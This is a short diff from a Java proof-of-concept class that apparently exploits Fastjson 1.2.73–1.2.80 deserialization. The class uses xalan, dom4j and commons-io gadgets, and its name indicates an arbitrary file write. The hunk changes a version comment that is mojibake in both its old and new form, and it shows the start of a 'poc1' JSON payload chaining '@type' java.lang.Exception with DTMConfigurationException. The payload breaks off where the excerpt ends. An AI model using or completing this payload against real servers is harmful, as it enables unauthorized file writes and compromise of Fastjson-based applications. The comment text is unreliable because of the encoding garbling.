@@ -10,7 +10,7 @@ public class Fastjson30_xalan_dom4j_io_write_2 {
 			code += "a";
 		}
     	
-        //“¿¿µ1.2.73-1.2.80 xalan-2.7.2 dom4j-2.1.3  commons-io-2.7/2.8
+        //‰æùËµñ1.2.73-1.2.80 xalan-2.7.2 dom4j-2.1.3  commons-io-2.7/2.8
         String poc1 = "{\r\n"
         		+ "		\"@type\": \"java.lang.Exception\",\r\n"
         		+ "		\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\"locator\":{}\r\n"
